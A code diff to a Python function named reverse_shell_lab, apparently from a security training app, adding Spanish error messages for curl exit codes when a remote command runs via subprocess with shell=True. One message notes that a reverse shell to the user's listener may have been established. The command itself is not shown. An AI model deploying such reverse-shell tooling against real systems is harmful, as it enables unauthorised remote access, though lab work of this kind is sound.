@@ -3615,7 +3615,23 @@ def reverse_shell_lab():
                 f"\""
             )
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=12)
-            output = result.stdout + result.stderr if (result.stdout or result.stderr) else '(sin respuesta del servidor remoto)'
+            # curl exit codes: 0=ok, 6=DNS fail, 7=connection refused, 28=timeout, 35=SSL, etc.
+            rc = result.returncode
+            if rc == 0 and result.stdout:
+                output = result.stdout
+            elif rc == 6:
+                output = f'[Error] No se pudo resolver el host — DNS lookup fallido para: {url}'
+            elif rc == 7:
+                output = f'[Error] Conexión rechazada — el host existe pero no acepta conexiones en ese puerto.'
+            elif rc == 28:
+                output = f'[Error] Timeout — el host no respondió en 5 segundos.'
+            elif rc == 35 or rc == 60:
+                output = f'[Error] Error SSL/TLS al conectar con: {url}'
+            elif rc != 0:
+                stderr = result.stderr.strip()
+                output = f'[Error curl {rc}] {stderr}' if stderr else f'[Error curl {rc}] El host no respondió o la URL no es válida.'
+            else:
+                output = '(sin respuesta del servidor remoto)'
         except subprocess.TimeoutExpired:
             output = '[timeout] La conexion al host tardó demasiado — si tu listener estaba activo, la shell puede haberse establecido.'
         except Exception as e:
